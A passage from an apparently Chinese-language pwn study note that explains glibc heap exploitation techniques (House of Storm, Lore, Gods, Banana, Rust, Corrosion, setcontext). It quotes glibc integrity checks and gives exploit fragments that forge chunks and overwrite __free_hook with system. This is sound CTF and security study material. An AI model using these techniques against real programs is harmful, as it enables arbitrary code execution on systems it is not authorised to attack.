</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x428</span><span class=p>)</span> <span class=c1># 大 chunk 2</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span> <span class=c1># 分割 top chunk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x500</span><span class=p>)</span> <span class=c1># chunk 0 进入 large bin</span></span></span></code></pre></div></div><p>构造 large bin attack 中的 large bin chunk</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>target_addr</span> <span class=o>-</span> <span class=mh>0x8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>target_addr</span> <span class=o>-</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=mh>0x18</span> <span class=o>-</span> <span class=mi>5</span><span class=p>))</span></span></span></code></pre></div></div><p>构造 unsorted bin attack 中的 unsorted bin chunk</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>target_addr</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>))</span> <span class=c1># bk 指向 fake_chunk</span></span></span></code></pre></div></div><p>触发 house of storm，申请出劫持到目标的堆块</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add_chunk</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>修复</strong></p><ul><li><p>glibc-2.27 加入 tcache，先遍历 unsorted bin，即使找到合适 chunk 也放入 tcache 然后继续遍历，会触发报错，需先填满 tcache ，通过 <code>calloc</code>申请触发</p></li><li><p>glibc-2.28 加入检查</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span> <span class=p>(</span><span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>!=</span> <span class=n>victim</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;malloc(): corrupted unsorted chunks 3&#34;</span><span class=p>);</span></span></span></code></pre></div></div></li><li><p>glibc-2.30 开始 large bin 加入检查</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span> <span class=p>(</span><span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>!=</span> <span class=n>fwd</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;malloc(): largebin double linked list corrupted (nextsize)&#34;</span><span class=p>);</span></span></span></code></pre></div></div></li></ul><p>方法失效</p><h4 id=house-of-lore>House Of Lore</h4><ul><li>small bin attack，需要堆地址、libc 基址</li></ul><p><strong>原理</strong></p><ul><li><p>申请 small bin 范围 chunk 1 以及一个隔开 top chunk 的 chunk 2</p></li><li><p>释放 chunk 1 进入 unsorted bin，申请一个更大内存使 chunk 1 进入 small bin</p></li><li><p><strong>绕过</strong>：通过构造 bk 以及伪造两个 fake chunk 绕过，该检查会检查取出来的 victim 的 bk 的 fd 是否指回 victim，其中 fake chunk 可以叠加在同一个数组 buf 中</p></li><li><p>最终申请 2 次将 chunk 1 的 bk 指向的 fake chunk 取出</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span><span class=p>(</span><span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>!=</span> <span class=n>victim</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>errstr</span> <span class=o>=</span> <span class=s>&#34;malloc(): smallbin double linked list corrupted&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>errout</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20250105164023680.png alt=图片无法加载><h4 id=house-of-gods>House of Gods</h4><p><strong>原理</strong></p><ul><li><p>&lt; glibc 2.27</p></li><li><p><code>main_arena</code>中有记录 bins 是否有空闲 chunk 的结构 <code>unsigned int binmap[BINMAPSIZE]</code>，每个 bin 用 32 位记录</p></li><li><p>两处代码对该结构进行修改</p></li></ul><p>① 赋值</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1>// 循环遍历unsorted bin中空闲chunk并将其分类到对应 small/large bin进行置位
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>mark_bin</span><span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>victim_index</span><span class=p>);</span></span></span></code></pre></div></div><p>② 清零</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 遍历 small/large bin 找大小不小于当前 chunk 的空闲 chunk 是时，若bin 中为空的时候更新，对应bit位置0其他位保持不变
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=n>victim</span> <span class=o>==</span> <span class=n>bin</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=n>av</span><span class=o>-&gt;</span><span class=n>binmap</span><span class=p>[</span><span class=n>block</span><span class=p>]</span> <span class=o>=</span> <span class=n>map</span> <span class=o>&amp;=</span> <span class=o>~</span><span class=n>bit</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20250109230747083.png alt=图片无法加载><p>若释放一个 0xa0 大小的 chunk 到 small bins 中可将 binmap 中第 9 位置位，此时可将 binmap 作为 0x200 大小 chunk，bk 指向 main_arena 的 next，next 指向 main_arena</p><h4 id=house-of-banana>House Of Banana</h4><p><strong>条件</strong></p><ul><li>需要泄露 libc 基址和堆地址，同一系统多次启动 ld 和 libc 的偏移相对固定，而远程需要爆破</li><li>只用一次任意地址写，large bin attack，攻击<code>rtld_global</code>结构体</li></ul><p><strong>原理</strong></p><p>关注内容：</p><ul><li><code>rtld_global</code>类型的<code>_rtld_global</code>变量中<ul><li><code>_dl_nns</code>值</li><li><code>_dl_ns</code>中<ul><li><code>_ns_nloaded</code>值</li><li><code>_ns_loaded</code>指向的<code>link_map</code>结构体<ul><li><code>l_addr</code>，<code>l_next</code>，<code>l_prev</code>，<code>l_real</code></li><li><code>l_info[DT_FINI_ARRAY] (l_info[26])</code>，<code>l_info[DT_FINI_ARRAYSZ] (l_info[28])</code>，<code>l_init_called</code></li></ul></li></ul></li></ul></li></ul><p><strong>绕过</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// ns = 0, LM_ID_BASE = 0 满足第二条，为满足第一项，使得i == nloaded = 4, 即需要伪造 4 个 link_map
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>assert</span> <span class=p>(</span><span class=n>ns</span> <span class=o>!=</span> <span class=n>LM_ID_BASE</span> <span class=o>||</span> <span class=n>i</span> <span class=o>==</span> <span class=n>nloaded</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>assert</span> <span class=p>(</span><span class=n>ns</span> <span class=o>==</span> <span class=n>LM_ID_BASE</span> <span class=o>||</span> <span class=n>i</span> <span class=o>==</span> <span class=n>nloaded</span> <span class=o>||</span> <span class=n>i</span> <span class=o>==</span> <span class=n>nloaded</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span></span></span></code></pre></div></div><p>需要<code>l_init_called</code>置位 1，该值所在地址偏移在不同版本不一致</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_init_called</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nf>_dl_call_fini</span> <span class=p>(</span><span class=n>l</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>利用构造</strong></p><p>不可随意构造结构，否则可能卡在<code>_dl_sort_maps</code>函数中，最终利用<code>_dl_fini</code>中<code>_dl_call_fini</code>的<code>((fini_t)array[sz])();</code>，劫持<code>array</code>最后一项为 one_gadget 或 backdoor 函数达成利用</p><img src=/img/pwn_note.zh-cn.assets/image-20250106205528076.png alt=图片无法加载><p>伪造堆块为 link_map 结构体，其中 l_init_called 设为<code>p8(1 &lt;&lt; 4)</code></p><img src=/img/pwn_note.zh-cn.assets/image-20250106233302379.png alt=图片无法加载><p><strong>过程</strong></p><ul><li>构造一个 0x458 大小的 chunk1 和 0x448 大小的 chunk2，释放 2 个 chunk 泄露 libc 基址和堆地址</li><li>gdb 通过<code>p &_rtld_global.dl_ns[0]._ns_loaded</code>获取其到 libc 基址的偏移 offset（远程需要爆破）</li><li>large bin attack 将<code>_ns_loaded</code>值修改为 chunk2 地址</li><li>伪造 chunk2 内容为 link_map 结构体，执行 exit 触发 one_gadget</li></ul><h4 id=house-of-rust>House of Rust</h4><ul><li>结合 tcachebin stash unlinking + largebin attack，实现任意地址 malloc</li></ul><p><strong>原理</strong></p><ul><li>把 <code>tcachebin[0x90]</code> 填满， <code>smallbin[0x90]</code> 释放进 7 个 chunk 且申请过程用小 chunk 分隔开防止合并</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20250107221505413.png alt=图片无法加载><ul><li>把 smallbin 最后一个 chunk 的 <code>size</code> 由 0x90 改成 0xb0 ，并释放到 <code>tcachebin[0xb0]</code>，这将改变其 <code>bk</code> 指向 <code>tcache_perthread_struct</code>，此时 fd 指向的内容 key 为堆地址去掉最低 3 字节的值（初次加密），可泄露堆地址，由偏移也可得到 tcache_perthread_struct 地址</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20250107221700359.png alt=图片无法加载><ul><li>使用 large bin attack 向 tcache_perthread_struct 的 bk 处写一个合法堆地址</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 使用 large bin attack 构造时堆状态</span>
</span></span><span class=line><span class=cl><span class=c1># prev_size &lt;---- heap_base</span>
</span></span><span class=line><span class=cl><span class=c1># size</span>
</span></span><span class=line><span class=cl><span class=c1># prev_size &lt;---- tcache_perthread_struct</span>
</span></span><span class=line><span class=cl><span class=c1># size</span>
</span></span><span class=line><span class=cl><span class=c1># fd</span>
</span></span><span class=line><span class=cl><span class=c1># bk &lt;---- 劫持位置</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x10</span> <span class=o>+</span> <span class=mh>0x18</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>))</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20250107221801028.png alt=图片无法加载><ul><li>耗尽<code>tcachebin[0x90]</code>中 7 个 chunk，再 malloc 分配一次则触发 tcache stash unlink，之后再 malloc 能分配到<code>tcache_perthread_struct</code>结构体进行劫持</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20250107221921525.png alt=图片无法加载><ul><li><strong>后续利用</strong>：控制该结构体部分写 libc 地址，分配到 stdout 结构体，泄露信息或分配到任意地址如<code>__free_hook</code>修改为 system 函数</li></ul><p>glibc-2.34 后，<code>tcache_key</code> 为随机数</p><h4 id=house-of-muney>House of Muney</h4><h4 id=house-of-corrosion>House Of Corrosion</h4><ul><li>已泄露 libc 基址，利用 malloc 和 free 对 fastbinsY 数组边界检查不严格，任意地址写</li><li>修改 global_max_fast 为极大值（可使用 large bin attack），使 fastbinsY 数组越界，此时超过 0x80 大小的 chunk 释放仍会进入到 fastbin 中</li><li>原先构造 chunk 大小计算为<code>chunk size = [(&amp;target - &amp;fastbinsY) * 2] + 0x20</code></li></ul><img src=/img/pwn_note.zh-cn.assets/image-20250106000423810.png alt=图片无法加载><p><strong>利用</strong></p><p>① 向 target 写入一个堆地址</p><img src=/img/pwn_note.zh-cn.assets/image-20250106001721829.png alt=图片无法加载><p>② 上图通过 UAF 伪造 chunk 的 fd 为 value，将该 chunk malloc 出来，链表操作可使得 target 写入 value 任意值</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 构造 chunk 1: + 0x8 为 mutex 和 flags，最终 + 0x10 为 chunk size 减去了头部0x10</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main_arena&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=p>))</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># chunk 1 进入 fastbin, 此时 target(__free_hook) 写入一个堆地址</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 修改 chunk 1 的 fd</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># 申请出来 chunk 后 target(__free_hook) 写入 value(system)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main_arena&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=p>))</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span></span></span></code></pre></div></div><p>③ 将任意地址值写到其它任意地址：向 target1 写 target2 的值</p><img src=/img/pwn_note.zh-cn.assets/image-20250106003019971.png alt=图片无法加载><ul><li><p>glibc-2.27 增加对 global_max_fast 检测，但实际分析汇编，检测被优化掉了</p></li><li><p>glibc-2.37 global_max_fast 数据类型修改为 int8_u 导致可控的空间范围大幅度缩小，最大为 0xff</p></li></ul><h4 id=house-of-一骑当千>House of 一骑当千</h4><ul><li>setcontext，利用通用方法直接调用 setcontext 函数对寄存器赋值</li><li>setcontext 函数原型</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>setcontext</span><span class=p>(</span><span class=k>const</span> <span class=kt>ucontext_t</span> <span class=o>*</span><span class=n>ucp</span><span class=p>)</span></span></span></code></pre></div></div><p><code>ucontext_t</code>结构体</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 用户级上下文，表示程序在某个时刻运行状态
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>typedef</span> <span class=k>struct</span> <span class=kt>ucontext_t</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>int</span> <span class=nf>__ctx</span><span class=p>(</span><span class=n>uc_flags</span><span class=p>);</span> <span class=c1>// 标志字，表示上下文状态
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=kt>ucontext_t</span> <span class=o>*</span><span class=n>uc_link</span><span class=p>;</span> <span class=c1>// 指向链表下一个ucontext_t指针，实现协程调度
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>stack_t</span> <span class=n>uc_stack</span><span class=p>;</span> <span class=c1>// 当前上下文使用的栈信息
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>mcontext_t</span> <span class=n>uc_mcontext</span><span class=p>;</span> <span class=c1>// 机器上下文，包含寄存器状态
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>sigset_t</span> <span class=n>uc_sigmask</span><span class=p>;</span> <span class=c1>// 信号屏蔽字，表示当前屏蔽的信号，用于信号处理
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=n>_libc_fpstate</span> <span class=n>__fpregs_mem</span><span class=p>;</span> <span class=c1>// 浮点寄存器状态结构体
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>__extension__</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=kt>int</span> <span class=n>__ssp</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span> <span class=c1>// 栈溢出保护字段，Stack smashing protection
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span> <span class=kt>ucontext_t</span><span class=p>;</span></span></span></code></pre></div></div><p><code>_libc_fpstate</code>结构体</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 保存与浮点运算相关寄存器状态
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>struct</span> <span class=n>_libc_fpstate</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>__uint16_t</span>        <span class=nf>__ctx</span><span class=p>(</span><span class=n>cwd</span><span class=p>);</span> <span class=c1>// 控制字，舍入模式/异常状态
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>__uint16_t</span>        <span class=nf>__ctx</span><span class=p>(</span><span class=n>swd</span><span class=p>);</span> <span class=c1>// 状态字，运算错误/栈溢出
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>__uint16_t</span>        <span class=nf>__ctx</span><span class=p>(</span><span class=n>ftw</span><span class=p>);</span> <span class=c1>// 标志字，栈状态
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>__uint16_t</span>        <span class=nf>__ctx</span><span class=p>(</span><span class=n>fop</span><span class=p>);</span> <span class=c1>// 浮点操作码，最近执行的浮点操作
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>__uint64_t</span>        <span class=nf>__ctx</span><span class=p>(</span><span class=n>rip</span><span class=p>);</span> <span class=c1>// 当前指令指针
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>__uint64_t</span>        <span class=nf>__ctx</span><span class=p>(</span><span class=n>rdp</span><span class=p>);</span> <span class=c1>// 数据指针
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>__uint32_t</span>        <span class=nf>__ctx</span><span class=p>(</span><span class=n>mxcsr</span><span class=p>);</span> <span class=c1>// MXCSR寄存器，控制SSE浮点操作状态
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>__uint32_t</span>        <span class=nf>__ctx</span><span class=p>(</span><span class=n>mxcr_mask</span><span class=p>);</span> <span class=c1>// MXCSR掩码，表示可以修改哪些部分
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=n>_libc_fpxreg</span>   <span class=n>_st</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// 8个浮点寄存器，每个64位
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=n>_libc_xmmreg</span>   <span class=n>_xmm</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span> <span class=c1>// 16个SSE寄存器，每个128位
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>__uint32_t</span>        <span class=n>__glibc_reserved1</span><span class=p>[</span><span class=mi>24</span><span class=p>];</span> <span class=c1>// 保留字段
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>};</span></span></span></code></pre></div></div><p><code>stack_t</code>结构体</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>ss_sp</span><span class=p>;</span> <span class=c1>// 栈的起始地址
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>ss_flags</span><span class=p>;</span> <span class=c1>// 栈的标志
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>size_t</span> <span class=n>ss_size</span><span class=p>;</span> <span class=c1>// 栈的大小
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span> <span class=kt>stack_t</span><span class=p>;</span></span></span></code></pre></div></div><p><code>mcontext_t</code>结构体</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>gregset_t</span> <span class=nf>__ctx</span><span class=p>(</span><span class=n>gregs</span><span class=p>);</span> <span class=c1>// 存储寄存器 setcontext+offset 所使用地方
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>fpregset_t</span> <span class=nf>__ctx</span><span class=p>(</span><span class=n>fpregs</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>__extension__</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>__reserved1</span> <span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// 保留
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span> <span class=kt>mcontext_t</span><span class=p>;</span></span></span></code></pre></div></div><p><strong>fpregs 指针需要指向一块可读写内存</strong>，经测试<code>uc_sigmask</code>与<code>__ssp</code>均可为 0</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
